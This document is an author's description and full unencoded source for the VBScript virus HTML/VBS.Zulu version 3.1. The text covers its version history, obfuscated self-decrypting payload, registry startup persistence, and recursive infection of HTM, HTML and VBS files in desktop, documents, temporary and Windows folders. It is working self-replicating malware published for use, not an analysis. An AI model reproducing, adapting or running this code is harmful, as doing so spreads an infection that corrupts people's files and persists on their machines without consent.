Virus Name: HTML/VBS.Zulu
Author: Zulu
Origin: Argentina

VBScript virus. It infects HTM, HTML and VBS (in 2.0, 3.0 and 3.1) files. The infected file
will create a VBS (in 1.0 and 2.0) or a VBE and a WSH (in 3.0 and 3.1) file at Windows
"SYSTEM" directory.
It will add the VBS or WSH file in the registry to infect at startup one of the following:

- All users desktop directory (in 2.0, 3.0 and 3.1).
- Desktop directory.
- Documents directory.
- Program files directory.
- Temporary directory.
- Windows "HELP" directory.
- Windows "SAMPLES" directory (in 2.0, 3.0 and 3.1).
- Windows "TEMPORARY INTERNET FILES" directory.

These directories will change depending of the Windows language.
The virus code will be appended at the end of the file.
The first of each month it will show a message (in 1.0 and 2.0).

Changes between 3.0 and 3.1:

- Better encryption on infected files.
- Other minor changes.

Changes between 2.0 and 3.0:

- The VBS file used at startup is now a VBE (encoded VBScript) file which is run by a WSH file.
- Fixed a bug in which VBS infected files return an error because they used "Option Explicit" in
  their code and the virus code wasn't declaring variables.
- Removed message.
- Other minor changes.

Changes between 1.0 and 2.0:

- VBS files infection.
- Better encryption (really the same as 1.0 but it takes a value from reading itself).
- Two new infection directories.
- Infection of all levels of subdirectories.
- Infection opening a HTM or HTML file is made only sometimes to make the ActiveX question
  less often.
- Remove many spaces and other minor changes.

Here is the VBE file from version 3.1 without encoding:

On Error Resume Next
Randomize
A1 = Int((8 - 1 + 1) * Rnd + 1)
Set A2 = CreateObject("Scripting.FileSystemObject")
Set A3 = CreateObject("WScript.Shell")
If A1 = 1 Then
A4 = A2.GetSpecialFolder(2)
ElseIf A1 = 2 Then
A4 = A2.BuildPath(A2.GetSpecialFolder(0),"HELP")
ElseIf A1 = 3 Then
A4 = A2.BuildPath(A2.GetSpecialFolder(0),"SAMPLES")
ElseIf A1 = 4 Then
A4 = A2.BuildPath(A2.GetSpecialFolder(0),"TEMPORARY INTERNET FILES")
ElseIf A1 = 5 Then
A4 = A3.SpecialFolders("AllUsersDesktop")
ElseIf A1 = 6 Then
A4 = A3.SpecialFolders("Desktop")
ElseIf A1 = 7 Then
A4 = A3.SpecialFolders("MyDocuments")
Else
A4 = A3.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
End If
If A2.FolderExists(A4) = True Then
B(A4)
End If
Sub B(B1)
For Each B2 In A2.GetFolder(B1).Files
If UCase(A2.GetExtensionName(B2)) = "HTM" Or UCase(A2.GetExtensionName(B2)) = "HTML" Or UCase(A2.GetExtensionName(B2)) = "VBS" Then
If C(B2) = False Then
D B2
End If
End If
Next
For Each B3 In A2.GetFolder(B1).SubFolders
B B3
Next
End Sub
Function C(C1)
Set C2 = A2.OpenTextFile(C1,1)
Do While C2.AtEndOfStream = False And C3 <> "JDX^MNB@M^"
C3 = Mid(C2.ReadLine,19,10)
Loop
C2.Close
If C3 = "JDX^MNB@M^" Then
C = True
Else
C = False
End If
End Function
Sub D(D1)
Set D2 = A2.GetFile(D1)
D3 = D2.Attributes
If D3 <> 0 Then
D2.Attributes = 0
End If
Set D4 = A2.OpenTextFile(D1,8)
D4.WriteLine("")
If UCase(A2.GetExtensionName(D1)) <> "VBS" Then
D4.WriteLine("<!--HTML/VBS.Zulu-->")
D4.WriteLine("<Script Language=""VBScript"">")
Else
D4.WriteLine("'HTML/VBS.Zulu")
End If
D4.WriteLine("On Error Resume Next")
D4.WriteLine("Dim A1,A2,A3,A4,A5,A6")
If UCase(A2.GetExtensionName(D1)) <> "VBS" Then
D4.WriteLine("If Location.Protocol = ""file:"" Then")
D4.WriteLine("Randomize")
D4.WriteLine("If Int((2 - 1 + 1) * Rnd + 1) = 1 Then")
End If
D4.WriteLine("Set A1 = CreateObject(""Scripting.FileSystemObject"")")
If UCase(A2.GetExtensionName(D1)) <> "VBS" Then
D4.WriteLine("Set A2 = A1.OpenTextFile(Replace(Location.PathName,""/"",""""),1)")
Else
D4.WriteLine("Set A2 = A1.OpenTextFile(WScript.ScriptFullName,1)")
End If
D4.WriteLine("Do While A2.AtEndOfStream = False And Mid(A3,10,10) <> ""!<!@0/Bsd`""")
D4.WriteLine("A3 = A2.ReadLine")
D4.WriteLine("Loop")
D4.WriteLine("B ""@3/Bmnrd""")
D4.WriteLine("B ""Rdu!@5!<!@0/Bsd`udUdyuGhmd)@0/CthmeQ`ui)@0/FduRqdbh`mGnmeds)0(-""""VHORU@SU/VRI""""(-Ustd(""")
D4.WriteLine("B ""@5/VshudMhod)""""ZRbshquGhmd\""""(""")
D4.WriteLine("B ""@5/VshudMhod)""""Q`ui<""""!'!@0/CthmeQ`ui)@0/FduRqdbh`mGnmeds)0(-""""VHORU@SU/WCD""""((""")
D4.WriteLine("B ""@5/Bmnrd""")
D4.WriteLine("B ""Rdu!@4!<!@0/Bsd`udUdyuGhmd)@0/CthmeQ`ui)@0/FduRqdbh`mGnmeds)0(-""""VHORU@SU/WCD""""(-Ustd(""")
Set D5 = A2.OpenTextFile(WScript.ScriptFullName,1)
D4.Write("A5.Write(C(""")
Do While D5.AtEndOfStream = False
D4.Write(Asc(D5.Read(1)) & ".")
Loop
D4.WriteLine("""))")
D5.Close
D4.WriteLine("B ""@4/Bmnrd""")
D4.WriteLine("B ""Rdu!@7!<!Bsd`udNckdbu)""""VRbshqu/Ridmm""""(""")
D4.WriteLine("B ""@7/SdfVshud!""""IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]VhoRu`su""""-@0/CthmeQ`ui)@0/FduRqdbh`mGnmeds)0(-""""VHORU@SU/VRI""""(""")
If UCase(A2.GetExtensionName(D1)) <> "VBS" Then
D4.WriteLine("End If")
D4.WriteLine("End If")
End If
D4.WriteLine("Sub B(B1)")
D4.WriteLine("Dim B2,B3")
D4.WriteLine("For B2 = 1 To Len(B1)")
D4.WriteLine("If Asc(Mid(B1,B2,1)) <> 34 And Asc(Mid(B1,B2,1)) <> 35 And Asc(Mid(B1,B2,1)) <> 126 Then")
D4.WriteLine("If Asc(Mid(B1,B2,1)) Mod 2 = 0 Then")
D4.WriteLine("B3 = B3 & Chr(Asc(Mid(B1,B2,1)) + Right(Asc(Mid(A3,50,1)) - 1,1))")
D4.WriteLine("Else")
D4.WriteLine("B3 = B3 & Chr(Asc(Mid(B1,B2,1)) - Right(Asc(Mid(A3,50,1)) - 1,1))")
D4.WriteLine("End If")
D4.WriteLine("Else")
D4.WriteLine("B3 = B3 & Mid(B1,B2,1)")
D4.WriteLine("End If")
D4.WriteLine("Next")
D4.WriteLine("Execute B3")
D4.WriteLine("End Sub")
D4.WriteLine("Function C(C1)")
D4.WriteLine("Dim C2")
D4.WriteLine("For C2 = 1 To Len(C1)")
D4.WriteLine("If InStr(C1,""."") <> 0 Then")
D4.WriteLine("C = C & Chr(Left(C1,InStr(C1,""."") - 1))")
D4.WriteLine("C1 = Mid(C1,InStr(C1,""."") + 1)")
D4.WriteLine("End If")
D4.WriteLine("Next")
D4.WriteLine("End Function")
If UCase(A2.GetExtensionName(D1)) <> "VBS" Then
D4.WriteLine("</Script>")
End If
D4.Close
If D3 <> 0 Then
D2.Attributes = D3
End If
End Sub
